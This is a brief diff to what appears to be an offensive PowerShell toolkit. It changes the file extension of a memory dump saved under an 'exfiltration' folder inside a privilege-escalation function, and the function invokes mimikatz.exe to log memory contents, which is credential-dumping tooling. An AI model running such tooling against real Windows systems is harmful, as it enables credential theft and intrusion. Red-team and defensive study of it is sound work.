@@ -76,7 +76,7 @@ function Invoke-PriviledgeEscalationViaMemoryAccess {
     }
 
     $name = get-date -Format 'yyyyMMddhhmmss'
-    $MemoryDump = "$($Script:DefautExfiltrationFolder)\$name.log"
+    $MemoryDump = "$($Script:DefautExfiltrationFolder)\$name.mem"
 
     Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe"  `
             "log $MemoryDump" `
